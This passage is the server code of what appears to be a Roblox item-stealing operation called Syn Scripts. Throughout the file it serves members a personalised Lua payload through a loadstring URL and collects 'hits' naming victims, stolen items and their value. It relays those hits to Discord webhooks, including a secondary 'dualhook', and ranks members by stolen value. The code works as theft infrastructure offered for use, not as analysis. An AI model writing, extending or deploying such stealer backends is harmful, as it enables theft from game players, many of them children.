import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { existsSync, readFileSync } from 'node:fs';
import { extname, join, normalize, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createHmac, randomUUID, timingSafeEqual } from 'node:crypto';
import { createStore, GAMES, gameName } from './db.js';

const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
const PUBLIC = join(ROOT, 'public');
const PORT = Number(process.env.PORT) || 5175;
const HOST = process.env.HOST || '127.0.0.1';

const store = createStore();
const bootedAt = Date.now();

const DISCORD_ID = process.env.DISCORD_CLIENT_ID ?? '';
const DISCORD_SECRET = process.env.DISCORD_CLIENT_SECRET ?? '';
const BASE_URL = process.env.PUBLIC_URL ?? `http://${HOST}:${PORT}`;
const DISCORD_ON = Boolean(DISCORD_ID && DISCORD_SECRET);

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.lua': 'text/plain; charset=utf-8',
  '.woff2': 'font/woff2',
};

// ---------- helpers ----------
const json = (res, code, body) => {
  const payload = JSON.stringify(body);
  res.writeHead(code, {
    'content-type': 'application/json; charset=utf-8',
    'cache-control': 'no-store',
    'content-length': Buffer.byteLength(payload),
  });
  res.end(payload);
};

const parseCookies = (header = '') =>
  Object.fromEntries(
    header.split(';').map((p) => p.trim()).filter(Boolean).map((p) => {
      const i = p.indexOf('=');
      return [p.slice(0, i), decodeURIComponent(p.slice(i + 1))];
    })
  );

const sessionCookie = (value, maxAge = 60 * 60 * 24 * 30) =>
  `syn_session=${value}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${maxAge}`;

const readBody = (req, limit = 256 * 1024) =>
  new Promise((resolve, reject) => {
    let size = 0;
    const chunks = [];
    req.on('data', (c) => {
      size += c.length;
      if (size > limit) { reject(new Error('payload too large')); req.destroy(); return; }
      chunks.push(c);
    });
    req.on('end', () => {
      const raw = Buffer.concat(chunks).toString('utf8');
      if (!raw) return resolve({});
      try { resolve(JSON.parse(raw)); } catch { reject(new Error('invalid json')); }
    });
    req.on('error', reject);
  });

const publicUser = (u) => ({
  id: u.id,
  username: u.username,
  display: u.display,
  avatar: u.avatar,
  role: u.role,
  banned: u.banned,
  ban_reason: u.ban_reason,
  created_at: u.created_at,
  last_seen: u.last_seen,
});

const maskWebhook = (url) => {
  if (!url) return null;
  try {
    const u = new URL(url);
    const parts = u.pathname.split('/').filter(Boolean);
    const tail = parts.at(-1) ?? '';
    return `${u.origin}/api/webhooks/${tail.slice(0, 4)}…${tail.slice(-4)}`;
  } catch { return '••••'; }
};

const currentUser = (req) => {
  const raw = parseCookies(req.headers.cookie).syn_session;
  return store.sessionUser(raw);
};

const requireUser = (req, res) => {
  const u = currentUser(req);
  if (!u) { json(res, 401, { error: 'Not authenticated' }); return null; }
  if (u.banned) { json(res, 403, { error: 'You have been banned from Syn Scripts.', reason: u.ban_reason }); return null; }
  return u;
};

const requireAdmin = (req, res) => {
  const u = requireUser(req, res);
  if (!u) return null;
  if (u.role !== 'admin') { json(res, 403, { error: 'Administrator privileges are required to view this page.' }); return null; }
  return u;
};

const paginate = (list, page = 1, perPage = 25) => {
  const total = list.length;
  const pages = Math.max(1, Math.ceil(total / perPage));
  const p = Math.min(Math.max(1, page), pages);
  return { rows: list.slice((p - 1) * perPage, p * perPage), total, page: p, pages, per_page: perPage };
};

// ---------- sse ----------
const streams = new Map();

const broadcast = (event, data, { userId = null } = {}) => {
  const frame = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const [res, meta] of streams) {
    if (!meta.isAdmin && userId && meta.userId !== userId) continue;
    try { res.write(frame); } catch { streams.delete(res); }
  }
};

const userSeries = (userId, hours, bucketMinutes) => {
  if (!userId) return [];
  const end = Date.now();
  const start = end - hours * 3600000;
  const buckets = Math.ceil((hours * 60) / bucketMinutes);
  const out = Array.from({ length: buckets }, (_, i) => {
    const at = start + i * bucketMinutes * 60000;
    const d = new Date(at);
    return {
      label: `${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`,
      at,
      hits: 0,
    };
  });
  for (const h of store.hits()) {
    if (h.user_id !== userId || h.created_at < start) continue;
    const idx = Math.min(buckets - 1, Math.floor((h.created_at - start) / (bucketMinutes * 60000)));
    if (idx >= 0) out[idx].hits += 1;
  }
  return out;
};

store.onHit((hit) => {
  const user = store.userById(hit.user_id);
  broadcast('hit', {
    id: hit.id,
    game: hit.game,
    game_name: gameName(hit.game),
    item: hit.item,
    value: hit.value,
    status: hit.status,
    created_at: hit.created_at,
    server_url: hit.server_url ?? null,
    executor: hit.executor ?? null,
    roblox_user: hit.roblox_user ?? null,
    user: user ? { username: user.username, avatar: user.avatar } : null,
  }, { userId: hit.user_id });
});

// ---------- discord delivery ----------
const deliveryChains = new Map();

const hitEmbed = (user, hit) => ({
  username: 'Syn Scripts',
  embeds: [{
    title: hit.item,
    color: 0xe63946,
    description: `**${hit.victim}** → ${user.username}`,
    fields: [
      { name: 'Game', value: gameName(hit.game), inline: true },
      { name: 'Value', value: String(hit.value), inline: true },
      { name: 'Status', value: hit.status, inline: true },
      { name: 'Roblox user', value: hit.roblox_user ?? 'unknown', inline: true },
      { name: 'Executor', value: hit.executor ?? 'unknown', inline: true },
      { name: 'Server', value: hit.server_url ? `[Join server](${hit.server_url})` : 'unknown', inline: false },
    ],
    footer: { text: 'Syn Scripts' },
    timestamp: new Date(hit.created_at).toISOString(),
  }],
});

async function postWebhook(url, payload) {
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(8000),
    });
    if (res.ok) return { ok: true, status: res.status };
    const text = (await res.text()).slice(0, 300);
    return { ok: false, status: res.status, error: text || `HTTP ${res.status}` };
  } catch (err) {
    return { ok: false, status: 0, error: err.message };
  }
}

const deliverHit = (user, hit) => {
  const run = async () => {
    const urls = [user.config.webhook, user.config.dualhook_enabled ? user.config.dualhook : null].filter(Boolean);
    if (!urls.length) {
      user.delivery = { last_at: Date.now(), last_ok: false, last_error: 'No webhook configured', count: user.delivery?.count ?? 0 };
      store.saveUser(user);
      return { ok: false, skipped: true, error: 'No webhook configured' };
    }
    const payload = hitEmbed(user, hit);
    const results = [];
    for (const url of urls) results.push(await postWebhook(url, payload));
    const ok = results.some((r) => r.ok);
    user.delivery = {
      last_at: Date.now(),
      last_ok: ok,
      last_error: ok ? null : (results.find((r) => !r.ok)?.error ?? 'Unknown error'),
      count: (user.delivery?.count ?? 0) + (ok ? 1 : 0),
    };
    store.saveUser(user);
    return { ok, results };
  };
  const prev = deliveryChains.get(user.id) ?? Promise.resolve();
  const next = prev.then(run, run);
  deliveryChains.set(user.id, next.catch(() => {}));
  return next;
};

// ---------- lua payload ----------
const CLIENT_LUA = readFileSync(join(ROOT, 'public/scripts/syn-client.lua'), 'utf8');

const luaScript = (user) => CLIENT_LUA
  .replaceAll('{{TOKEN}}', user.webhook_token)
  .replaceAll('{{ENDPOINT}}', `${BASE_URL}/api/webhooks/${user.webhook_token}`)
  .replaceAll('{{MIN_VALUE}}', String(Number(user.config.min_value) || 1));

// ---------- api ----------
const api = {
  'GET /api/me': (req, res) => {
    const u = requireUser(req, res);
    if (!u) return;
    json(res, 200, { user: publicUser(u) });
  },

  'GET /api/config': (req, res) => {
    const u = requireUser(req, res);
    if (!u) return;
    json(res, 200, {
      webhook_set: Boolean(u.config.webhook),
      webhook_mask: u.config.webhook ? maskWebhook(u.config.webhook) : null,
      dualhook_set: Boolean(u.config.dualhook),
      dualhook_mask: u.config.dualhook ? maskWebhook(u.config.dualhook) : null,
      receivers: u.config.receivers,
      dualhook_enabled: u.config.dualhook_enabled,
      delivery: u.delivery ?? { last_at: null, last_ok: null, last_error: null, count: 0 },
      min_value: u.config.min_value,
      api_key: u.api_key,
      loadstring_url: `${BASE_URL}/raw/${u.webhook_token}.lua`,
    });
  },

  'PUT /api/config': async (req, res) => {
    const u = requireUser(req, res);
    if (!u) return;
    const body = await readBody(req);
    if ('webhook' in body) {
      const w = String(body.webhook ?? '').trim();
      const valid = (x) => !x
        || /^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(x)
        || /^https:\/\/discord(app)?\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(x)
        || /^http:\/\/(127\.0\.0\.1|localhost)(:\d+)?\//.test(x);
      if (!valid(w)) {
        return json(res, 400, { error: 'Webhook must be a Discord webhook URL (https://discord.com/api/webhooks/...)' });
      }
      u.config.webhook = w || null;
    }
    if ('receivers' in body) {
      const list = Array.isArray(body.receivers) ? body.receivers : [];
      u.config.receivers = [...new Set(list.map((r) => String(r).trim()).filter(Boolean))].slice(0, 25);
    }
    if ('dualhook' in body) {
      const d = String(body.dualhook ?? '').trim();
      const okDual = !d
        || /^https:\/\/discord(app)?\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(d)
        || /^http:\/\/(127\.0\.0\.1|localhost)(:\d+)?\//.test(d);
      if (!okDual) return json(res, 400, { error: 'Dualhook must be a Discord webhook URL' });
      u.config.dualhook = d || null;
    }
    if ('dualhook_enabled' in body) u.config.dualhook_enabled = Boolean(body.dualhook_enabled);
    if ('min_value' in body) u.config.min_value = Math.max(0, Number(body.min_value) || 0);
    store.saveUser(u);
    json(res, 200, { ok: true, message: 'Configuration saved.' });
  },

  'POST /api/config/test': async (req, res) => {
    const u = requireUser(req, res);
    if (!u) return;
    if (!u.config.webhook) return json(res, 400, { error: 'Add a Discord webhook first' });
    const hit = store.addHit({
      id: randomUUID(),
      user_id: u.id,
      game: 'mm2',
      item: 'Delivery test',
      victim: 'selftest',
      value: 1,
      status: 'claimed',
      created_at: Date.now(),
      place_id: 142823291,
      server_id: 'selftest-job-id',
      server_url: 'https://www.roblox.com/games/start?placeId=142823291&gameInstanceId=selftest-job-id',
      executor: 'selftest',
      roblox_user: u.username,
    });
    const delivery = await deliverHit(u, hit);
    json(res, delivery.ok ? 200 : 502, {
      ok: delivery.ok,
      results: delivery.results ?? [],
      error: delivery.error ?? delivery.results?.find((r) => !r.ok)?.error ?? null,
    });
  },

  'GET /api/stats': (req, res) => {
    const u = requireUser(req, res);
    if (!u) return;
    const s = store.stats();
    const mine = store.hits().filter((h) => h.user_id === u.id);
    const dayStart = new Date().setHours(0, 0, 0, 0);
    const perGame = new Map(GAMES.map((g) => [g.id, { game: g.id, hits: 0, value: 0 }]));
    for (const h of mine) {
      const row = perGame.get(h.game);
      if (row) { row.hits += 1; row.value += h.value; }
    }
    const liveServers = new Set(
      mine
        .filter((h) => h.server_id && h.created_at >= Date.now() - 6 * 3600000)
        .map((h) => `${h.place_id}:${h.server_id}`),
    );
    json(res, 200, {
      ...s,
      series24h: store.series(24, 60),
      series14d: store.series(24 * 14, 1440),
      mine: {
        hits: mine.length,
        value: Math.round(mine.reduce((a, h) => a + h.value, 0) * 100) / 100,
        receivers: u.config.receivers.length,
        today: mine.filter((h) => h.created_at >= dayStart).length,
        games: [...perGame.values()],
        servers: liveServers.size,
        series24h: userSeries(u.id, 24, 60),
        series14d: userSeries(u.id, 24 * 14, 1440),
      },
      webhook_set: Boolean(u.config.webhook),
    });
  },

  'POST /api/hits/clear': (req, res) => {
    const u = requireUser(req, res);
    if (!u) return;
    const removed = store.clearHits(u.id);
    json(res, 200, { ok: true, removed });
  },

  'GET /api/public/stats': (req, res) => {
    const s = store.stats();
    json(res, 200, { total_hits: s.total_hits, total_users: s.total_users, games: GAMES.length });
  },

  'GET /api/hits': (req, res, url) => {
    const u = requireUser(req, res);
    if (!u) return;
    const result = queryHits(store.hits().filter((h) => h.user_id === u.id), url, 'mine');
    json(res, 200, { ...result, rows: result.rows.map((h) => ({ ...h, game_name: gameName(h.game) })) });
  },

  'GET /api/hits/public': (req, res, url) => {
    if (!requireAdmin(req, res)) return;
    const rows = store.hits().slice(0, 300).map((h) => {
      const owner = store.userById(h.user_id);
      return {
        id: h.id,
        game: h.game,
        game_name: gameName(h.game),
        item: h.item,
        value: h.value,
        status: h.status,
        created_at: h.created_at,
        server_url: h.server_url ?? null,
        executor: h.executor ?? null,
        roblox_user: h.roblox_user ?? null,
        user: owner ? { username: owner.username, avatar: owner.avatar } : { username: 'unknown', avatar: null },
      };
    });
    json(res, 200, { ...paginate(rows, Number(url.searchParams.get('page') ?? 1), 50), note: 'Most recent 300' });
  },

  'GET /api/servers': (req, res, url) => {
    const u = requireUser(req, res);
    if (!u) return;
    const isAdminViewer = u.role === 'admin';
    const hours = Number(url.searchParams.get('hours')) || 6;
    const cutoff = Date.now() - hours * 3600000;
    const gameFilter = url.searchParams.get('game') ?? 'all';
    const groups = new Map();

    for (const h of store.hits()) {
      if (!isAdminViewer && h.user_id !== u.id) continue;
      if (h.created_at < cutoff || !h.server_id) continue;
      if (gameFilter !== 'all' && h.game !== gameFilter) continue;
      const key = `${h.place_id ?? '0'}:${h.server_id}`;
      let row = groups.get(key);
      if (!row) {
        row = {
          place_id: h.place_id ?? null,
          server_id: h.server_id,
          server_url: h.server_url ?? null,
          game: h.game,
          game_name: gameName(h.game),
          hits: 0,
          value: 0,
          items: new Map(),
          users: new Set(),
          executors: new Set(),
          last_seen: 0,
        };
        groups.set(key, row);
      }
      row.hits += 1;
      row.value += h.value;
      const it = row.items.get(h.item) ?? { item: h.item, count: 0, value: 0 };
      it.count += 1;
      it.value += h.value;
      row.items.set(h.item, it);
      if (h.roblox_user) row.users.add(h.roblox_user);
      if (h.executor) row.executors.add(h.executor);
      row.last_seen = Math.max(row.last_seen, h.created_at);
    }

    const servers = [...groups.values()]
      .map((r) => ({
        place_id: r.place_id,
        server_id: r.server_id,
        server_url: r.server_url,
        game: r.game,
        game_name: r.game_name,
        hits: r.hits,
        value: Math.round(r.value * 100) / 100,
        items: [...r.items.values()].sort((a, b) => b.value - a.value).slice(0, 8),
        users: [...r.users].slice(0, 6),
        executors: [...r.executors].slice(0, 4),
        last_seen: r.last_seen,
      }))
      .sort((a, b) => b.last_seen - a.last_seen)
      .slice(0, 60);

    json(res, 200, { servers, hours, game: gameFilter });
  },

  'GET /api/leaderboard': (req, res, url) => {
    const u = requireAdmin(req, res);
    if (!u) return;
    const game = url.searchParams.get('game') ?? 'all';
    const range = url.searchParams.get('range') ?? 'all';
    const cutoff = range === '24h' ? Date.now() - 86400000
      : range === '7d' ? Date.now() - 7 * 86400000
        : range === '14d' ? Date.now() - 14 * 86400000 : 0;

    const agg = new Map();
    for (const h of store.hits()) {
      if (h.created_at < cutoff) continue;
      if (game !== 'all' && h.game !== game) continue;
      const row = agg.get(h.user_id) ?? { user_id: h.user_id, hits: 0, value: 0 };
      row.hits += 1;
      row.value += h.value;
      agg.set(h.user_id, row);
    }
    const rows = [...agg.values()]
      .map((r) => {
        const owner = store.userById(r.user_id);
        return {
          username: owner?.username ?? 'unknown',
          avatar: owner?.avatar ?? null,
          banned: owner?.banned ?? false,
          hits: r.hits,
          value: Math.round(r.value * 100) / 100,
          you: r.user_id === u.id,
        };
      })
      .sort((a, b) => b.value - a.value)
      .map((r, i) => ({ rank: i + 1, ...r }));

    json(res, 200, { ...paginate(rows, Number(url.searchParams.get('page') ?? 1), 25), game, range });
  },

  'GET /api/public/stream': (req, res) => {
    const viewer = currentUser(req);
    const viewerId = viewer?.id ?? null;
    const isAdmin = viewer?.role === 'admin';
    const seriesForViewer = () => (isAdmin ? store.series(3, 10) : userSeries(viewerId, 3, 10));

    if (!String(req.headers.accept ?? '').includes('text/event-stream')) {
      return json(res, 200, seriesForViewer());
    }
    res.writeHead(200, {
      'content-type': 'text/event-stream; charset=utf-8',
      'cache-control': 'no-cache, no-transform',
      connection: 'keep-alive',
      'x-accel-buffering': 'no',
    });
    res.write(`retry: 3000\n\n`);
    res.write(`event: series\ndata: ${JSON.stringify(seriesForViewer())}\n\n`);
    streams.set(res, { userId: viewerId, isAdmin });
    const tick = setInterval(() => {
      try { res.write(`event: series\ndata: ${JSON.stringify(seriesForViewer())}\n\n`); } catch { /* dropped */ }
    }, 12000);
    const bye = () => { clearInterval(tick); streams.delete(res); };
    req.on('close', bye);
    req.on('aborted', bye);
  },

  'GET /api/hits/export.csv': (req, res) => {
    const u = requireUser(req, res);
    if (!u) return;
    const rows = store.hits().filter((h) => h.user_id === u.id);
    const esc = (v) => `"${String(v).replace(/"/g, '""')}"`;
    const csv = ['timestamp,game,item,victim,value,status']
      .concat(rows.map((h) => [new Date(h.created_at).toISOString(), gameName(h.game), h.item, h.victim, h.value, h.status].map(esc).join(',')))
      .join('\n');
    res.writeHead(200, { 'content-type': 'text/csv; charset=utf-8', 'content-disposition': 'attachment; filename="syn-hits.csv"' });
    res.end(csv);
  },

  'GET /api/admin/users': (req, res, url) => {
    const admin = requireAdmin(req, res);
    if (!admin) return;
    const q = (url.searchParams.get('search') ?? '').toLowerCase();
    const rows = store.raw().users
      .filter((u) => !q || u.username.toLowerCase().includes(q))
      .map((u) => ({
        ...publicUser(u),
        hits: store.hits().filter((h) => h.user_id === u.id).length,
        receivers: u.config.receivers.length,
        webhook_set: Boolean(u.config.webhook),
      }))
      .sort((a, b) => b.created_at - a.created_at);
    json(res, 200, paginate(rows, Number(url.searchParams.get('page') ?? 1), 25));
  },

  'PUT /api/admin/users/:id': async (req, res, url, params) => {
    const admin = requireAdmin(req, res);
    if (!admin) return;
    const target = store.userById(params.id);
    if (!target) return json(res, 404, { error: 'Member not found' });
    const body = await readBody(req);
    if ('banned' in body) {
      if (target.id === admin.id) return json(res, 400, { error: 'You cannot ban yourself' });
      target.banned = Boolean(body.banned);
      target.ban_reason = body.banned ? String(body.reason ?? 'No reason given') : null;
    }
    if ('role' in body && ['member', 'admin'].includes(body.role)) target.role = body.role;
    store.saveUser(target);
    json(res, 200, { ok: true, user: publicUser(target) });
  },

  'GET /api/admin/hits': (req, res, url) => {
    const admin = requireAdmin(req, res);
    if (!admin) return;
    const rows = store.hits().slice(0, 5000).map((h) => {
      const owner = store.userById(h.user_id);
      return { ...h, game_name: gameName(h.game), username: owner?.username ?? 'unknown' };
    });
    json(res, 200, queryHits(rows, url, 'admin'));
  },

  'DELETE /api/admin/hits/:id': (req, res, url, params) => {
    if (!requireAdmin(req, res)) return;
    const ok = store.removeHit(params.id);
    json(res, ok ? 200 : 404, ok ? { ok: true } : { error: 'Hit not found' });
  },

  'GET /api/admin/blacklist': (req, res, url) => {
    if (!requireAdmin(req, res)) return;
    const q = (url.searchParams.get('search') ?? '').toLowerCase();
    const rows = store.blacklist().filter((b) => !q || b.username.toLowerCase().includes(q));
    json(res, 200, paginate(rows, Number(url.searchParams.get('page') ?? 1), 25));
  },

  'POST /api/admin/blacklist': async (req, res) => {
    const admin = requireAdmin(req, res);
    if (!admin) return;
    const body = await readBody(req);
    const username = String(body.username ?? '').trim();
    if (!username) return json(res, 400, { error: 'Roblox username is required' });
    if (store.isBlacklisted(username)) return json(res, 409, { error: 'That username is already blacklisted' });
    const entry = store.addBlacklist({
      id: randomUUID(),
      username,
      reason: String(body.reason ?? '').trim() || 'No reason given',
      created_at: Date.now(),
      added_by: admin.username,
    });
    json(res, 201, { ok: true, entry });
  },

  'DELETE /api/admin/blacklist/:id': (req, res, url, params) => {
    if (!requireAdmin(req, res)) return;
    const ok = store.removeBlacklist(params.id);
    json(res, ok ? 200 : 404, ok ? { ok: true } : { error: 'Entry not found' });
  },

  'GET /api/admin/system': (req, res) => {
    if (!requireAdmin(req, res)) return;
    const s = store.stats();
    const dbSize = Buffer.byteLength(JSON.stringify(store.raw()));
    json(res, 200, {
      uptime: Math.floor((Date.now() - bootedAt) / 1000),
      db_size: dbSize,
      db_size_human: dbSize > 1048576 ? `${(dbSize / 1048576).toFixed(2)} MB` : `${(dbSize / 1024).toFixed(1)} KB`,
      total_hits: s.total_hits,
      total_users: s.total_users,
      hits_today: s.hits_today,
      active_receivers: store.raw().users.reduce((a, u) => a + u.config.receivers.length, 0),
      banned: s.banned,
      blacklisted: s.blacklisted,
      online: s.online,
      discord_oauth: DISCORD_ON,
      node: process.version,
      games: GAMES,
    });
  },

  'GET /api/roblox/search': async (req, res, url) => {
    if (!requireUser(req, res)) return;
    const keyword = String(url.searchParams.get('keyword') ?? '').trim();
    if (!keyword) return json(res, 200, { users: [] });
    try {
      const r = await fetch(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(keyword)}&limit=8`, {
        signal: AbortSignal.timeout(4000),
      });
      if (!r.ok) throw new Error(`roblox ${r.status}`);
      const data = await r.json();
      return json(res, 200, {
        users: (data.data ?? []).map((u) => ({ id: u.id, name: u.name, display: u.displayName })),
        source: 'roblox',
      });
    } catch {
      return json(res, 200, {
        users: [{ id: 0, name: keyword, display: keyword }],
        source: 'offline',
        note: 'Roblox API unreachable — using the typed name.',
      });
    }
  },

  'GET /api/roblox/headshots': async (req, res, url) => {
    const ids = String(url.searchParams.get('ids') ?? '').split(',').filter(Boolean).slice(0, 20);
    json(res, 200, { thumbs: ids.map((id) => ({ id, url: `https://www.roblox.com/headshot-thumbnail/image?userId=${id}&width=150&height=150&format=png` })) });
  },
};

function queryHits(source, url, scope) {
  const game = url.searchParams.get('game') ?? 'all';
  const range = url.searchParams.get('range') ?? 'all';
  const search = (url.searchParams.get('search') ?? '').toLowerCase();
  const sort = url.searchParams.get('sort') ?? 'recent';
  const dir = url.searchParams.get('dir') === 'asc' ? 1 : -1;

  const cutoff = range === '24h' ? Date.now() - 86400000
    : range === '7d' ? Date.now() - 7 * 86400000
      : range === '14d' ? Date.now() - 14 * 86400000 : 0;

  let rows = source.filter((h) => h.created_at >= cutoff && (game === 'all' || h.game === game));
  if (search) {
    rows = rows.filter((h) => `${h.item} ${h.victim ?? ''} ${gameName(h.game)} ${h.username ?? ''}`.toLowerCase().includes(search));
  }
  rows = [...rows].sort((a, b) => {
    if (sort === 'value') return (a.value - b.value) * dir;
    if (sort === 'item') return a.item.localeCompare(b.item) * dir;
    if (sort === 'game') return a.game.localeCompare(b.game) * dir;
    return (a.created_at - b.created_at) * dir;
  });

  const page = Number(url.searchParams.get('page') ?? 1);
  return { ...paginate(rows, page, scope === 'admin' ? 40 : 25), game, range, sort };
}

// ---------- static ----------
async function serveStatic(res, pathname) {
  const safe = normalize(pathname).replace(/^(\.\.[/\\])+/, '');
  let filePath = join(PUBLIC, safe === '/' ? 'index.html' : safe);
  if (!filePath.startsWith(PUBLIC)) filePath = join(PUBLIC, 'index.html');
  if (!existsSync(filePath)) filePath = join(PUBLIC, 'index.html');
  try {
    const data = await readFile(filePath);
    res.writeHead(200, {
      'content-type': MIME[extname(filePath)] ?? 'application/octet-stream',
      'cache-control': 'no-cache',
      'x-content-type-options': 'nosniff',
      'x-frame-options': 'DENY',
    });
    res.end(data);
  } catch {
    res.writeHead(404, { 'content-type': 'text/plain' });
    res.end('not found');
  }
}

// ---------- router ----------
const server = createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host ?? HOST}`);
  const pathname = url.pathname;
  const method = req.method ?? 'GET';

  try {
    if (pathname === '/health') {
      return json(res, 200, { status: 'ok', service: 'web-app', uptime: Math.floor(process.uptime()) });
    }

    if (pathname === '/auth/discord') {
      if (!DISCORD_ON) return json(res, 503, { error: 'Discord OAuth is not configured on this instance.' });
      const state = randomUUID();
      res.writeHead(302, {
        'set-cookie': `syn_state=${state}; Path=/; HttpOnly; SameSite=Lax; Max-Age=600`,
        location: `https://discord.com/oauth2/authorize?client_id=${DISCORD_ID}&response_type=code&scope=identify&redirect_uri=${encodeURIComponent(`${BASE_URL}/auth/discord/callback`)}&state=${state}`,
      });
      return res.end();
    }

    if (pathname === '/auth/discord/callback') {
      if (!DISCORD_ON) return json(res, 503, { error: 'Discord OAuth is not configured on this instance.' });
      const code = url.searchParams.get('code');
      const state = url.searchParams.get('state');
      const expected = parseCookies(req.headers.cookie).syn_state;
      if (!code || !expected || state !== expected) return json(res, 400, { error: 'Invalid redirect location' });

      const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: DISCORD_ID,
          client_secret: DISCORD_SECRET,
          grant_type: 'authorization_code',
          code,
          redirect_uri: `${BASE_URL}/auth/discord/callback`,
        }),
      });
      if (!tokenRes.ok) return json(res, 400, { error: 'Discord rejected the login' });
      const { access_token: accessToken } = await tokenRes.json();
      const meRes = await fetch('https://discord.com/api/users/@me', { headers: { authorization: `Bearer ${accessToken}` } });
      if (!meRes.ok) return json(res, 400, { error: 'Could not read your Discord profile' });
      const profile = await meRes.json();

      let user = store.userByDiscord(profile.id);
      if (!user) {
        const base = String(profile.username ?? 'member').replace(/[^a-zA-Z0-9_]/g, '') || 'member';
        let name = base;
        let n = 1;
        while (store.userByUsername(name)) { name = `${base}${n}`; n += 1; }
        user = store.createUser({
          username: name,
          discord_id: profile.id,
          avatar: profile.avatar ? `https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png?size=128` : `https://cdn.discordapp.com/embed/avatars/0.png`,
        });
      }
      user.last_seen = Date.now();
      store.saveUser(user);
      const session = store.createSession(user.id);
      res.writeHead(302, { 'set-cookie': sessionCookie(session), location: '/overview' });
      return res.end();
    }

    if (pathname === '/auth/dev' && method === 'POST') {
      const body = await readBody(req);
      const raw = String(body.username ?? '').trim().replace(/[^a-zA-Z0-9_.-]/g, '');
      if (raw.length < 2) return json(res, 400, { error: 'Pick a username with at least 2 characters' });
      let user = store.userByUsername(raw);
      if (!user) {
        const isFirst = store.raw().users.length === 0;
        const role = isFirst || raw.toLowerCase() === 'syn' ? 'admin' : 'member';
        user = store.createUser({ username: raw, role });
      }
      if (user.banned) return json(res, 403, { error: 'You have been banned from Syn Scripts.' });
      user.last_seen = Date.now();
      store.saveUser(user);
      const session = store.createSession(user.id);
      res.writeHead(200, { 'content-type': 'application/json', 'set-cookie': sessionCookie(session) });
      return res.end(JSON.stringify({ user: publicUser(user) }));
    }

    if (pathname === '/auth/logout' && method === 'POST') {
      store.destroySession(parseCookies(req.headers.cookie).syn_session);
      res.writeHead(200, { 'content-type': 'application/json', 'set-cookie': 'syn_session=; Path=/; Max-Age=0' });
      return res.end(JSON.stringify({ ok: true }));
    }

    const rawMatch = pathname.match(/^\/raw\/([a-f0-9]{8,64})\.lua$/);
    if (rawMatch) {
      const user = store.userByToken(rawMatch[1]);
      if (!user) { res.writeHead(404, { 'content-type': 'text/plain' }); return res.end('-- invalid token'); }
      res.writeHead(200, { 'content-type': 'text/plain; charset=utf-8', 'cache-control': 'no-store' });
      return res.end(luaScript(user));
    }

    const hookMatch = pathname.match(/^\/api\/webhooks\/([a-f0-9]{8,64})$/);
    if (hookMatch && method === 'POST') {
      const user = store.userByToken(hookMatch[1]);
      if (!user) return json(res, 401, { error: 'Unknown webhook token' });
      if (user.banned) return json(res, 403, { error: 'Account banned' });
      const body = await readBody(req);
      const list = Array.isArray(body) ? body : [body];
      const accepted = [];
      for (const entry of list.slice(0, 25)) {
        const game = GAMES.some((g) => g.id === entry.game) ? entry.game : null;
        if (!game) continue;
        const victim = String(entry.victim ?? '').slice(0, 40);
        if (victim && store.isBlacklisted(victim)) continue;
        const value = Math.max(0, Number(entry.value) || 0);
        if (value < (user.config.min_value ?? 0)) continue;
        const clean = (v, n) => String(v ?? '').replace(/[<>\r\n]/g, '').trim().slice(0, n);
        const placeId = Number(entry.place_id) || null;
        const serverId = clean(entry.server_id, 60) || null;
        accepted.push(store.addHit({
          id: randomUUID(),
          user_id: user.id,
          game,
          item: clean(entry.item, 80) || 'Unknown',
          victim: victim || 'Unknown victim',
          value,
          status: 'claimed',
          created_at: Date.now(),
          place_id: placeId,
          server_id: serverId,
          server_url: placeId && serverId
            ? `https://www.roblox.com/games/start?placeId=${placeId}&gameInstanceId=${encodeURIComponent(serverId)}`
            : null,
          executor: clean(entry.executor, 40) || null,
          roblox_user: clean(entry.roblox_user, 40) || null,
        }));
      }
      user.last_seen = Date.now();
      store.saveUser(user);
      const delivery = accepted.length ? await deliverHit(user, accepted[0]) : null;
      return json(res, 202, {
        ok: true,
        accepted: accepted.length,
        delivered: delivery ? delivery.ok : false,
        delivery_error: delivery && !delivery.ok ? (delivery.error ?? delivery.results?.find((r) => !r.ok)?.error ?? null) : null,
      });
    }

    const routeKey = Object.keys(api).find((k) => {
      const [m, pattern] = k.split(' ');
      if (m !== method) return false;
      if (!pattern.includes(':')) return pattern === pathname;
      const a = pattern.split('/');
      const b = pathname.split('/');
      return a.length === b.length && a.every((seg, i) => seg.startsWith(':') || seg === b[i]);
    });

    if (routeKey) {
      const params = {};
      const pattern = routeKey.split(' ')[1].split('/');
      const actual = pathname.split('/');
      pattern.forEach((seg, i) => { if (seg.startsWith(':')) params[seg.slice(1)] = decodeURIComponent(actual[i]); });
      return await api[routeKey](req, res, url, params);
    }

    if (pathname.startsWith('/api/')) return json(res, 404, { error: 'Not found' });

    if (method !== 'GET' && method !== 'HEAD') {
      res.writeHead(405, { 'content-type': 'text/plain' });
      return res.end('method not allowed');
    }
    return await serveStatic(res, pathname === '/' ? '/overview' : pathname);
  } catch (err) {
    const status = err?.message === 'invalid json' ? 400 : 500;
    if (status === 500) console.error('[syn]', err);
    return json(res, status, { error: status === 500 ? 'Internal server error' : 'Bad request' });
  }
});

server.listen(PORT, HOST, () => {
  console.log(`[syn] listening on http://${HOST}:${PORT}`);
  console.log(`[syn] discord oauth: ${DISCORD_ON ? 'configured' : 'off (demo login available)'}`);
